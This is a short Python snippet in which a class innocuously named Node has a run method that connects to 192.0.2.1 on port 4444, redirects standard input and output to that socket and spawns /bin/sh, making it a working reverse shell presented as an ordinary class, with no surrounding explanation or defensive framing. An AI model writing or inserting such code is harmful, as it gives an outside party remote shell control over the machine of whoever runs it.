import socket, os, pty

class Node:
    def run(self):
        s = socket.socket()
        s.connect(('192.0.2.1', 4444))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        pty.spawn('/bin/sh')
